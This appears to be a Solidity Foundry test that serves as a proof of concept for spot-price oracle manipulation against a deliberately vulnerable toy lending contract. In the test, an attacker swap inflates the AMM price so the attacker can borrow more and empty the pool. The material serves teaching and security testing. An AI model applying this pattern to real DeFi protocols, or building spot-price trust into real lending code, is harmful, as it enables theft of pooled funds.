// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";

import {SimpleAMM} from "../../src/oracle-manipulation/SimpleAMM.sol";
import {VulnerableLending} from "../../src/oracle-manipulation/VulnerableLending.sol";

/// @title OracleManipulationPoC
/// @notice Demonstrates how trusting an AMM spot price can inflate borrowing power.
contract OracleManipulationPoC is Test {
    SimpleAMM internal amm;
    VulnerableLending internal lending;

    address internal attacker = makeAddr("attacker");

    uint256 internal constant INITIAL_COLLATERAL_RESERVE = 1_000;
    uint256 internal constant INITIAL_DEBT_RESERVE = 1_000;
    uint256 internal constant LENDING_LIQUIDITY = 1_000;
    uint256 internal constant ATTACKER_COLLATERAL = 100;

    function setUp() public {
        amm = new SimpleAMM(INITIAL_COLLATERAL_RESERVE, INITIAL_DEBT_RESERVE);
        lending = new VulnerableLending(amm);

        lending.fundDebtAsset(LENDING_LIQUIDITY);
    }

    function testExploit_SpotPriceManipulationInflatesBorrowLimit() public {
        vm.startPrank(attacker);
        lending.depositCollateral(ATTACKER_COLLATERAL);

        uint256 normalPrice = amm.getSpotPrice();
        uint256 normalMaxBorrow = lending.maxBorrow(attacker);

        amm.swapDebtForCollateral(9_000);

        uint256 manipulatedPrice = amm.getSpotPrice();
        uint256 manipulatedMaxBorrow = lending.maxBorrow(attacker);

        assertGt(manipulatedPrice, normalPrice, "spot price should be manipulated upward");
        assertGt(manipulatedMaxBorrow, normalMaxBorrow, "borrow limit should be inflated");

        lending.borrow(LENDING_LIQUIDITY);

        assertEq(lending.debtAssetBalances(attacker), LENDING_LIQUIDITY, "attacker should drain debt liquidity");
        assertEq(lending.debtAssetLiquidity(), 0, "lending pool should be empty");

        vm.stopPrank();
    }

    function testNormalPriceOnlyAllowsLimitedBorrow() public {
        vm.startPrank(attacker);
        lending.depositCollateral(ATTACKER_COLLATERAL);

        uint256 normalMaxBorrow = lending.maxBorrow(attacker);
        assertEq(normalMaxBorrow, 50, "100 collateral at 50% LTV and price 1 should allow 50 debt");

        vm.expectRevert("insufficient collateral");
        lending.borrow(normalMaxBorrow + 1);

        vm.stopPrank();
    }
}
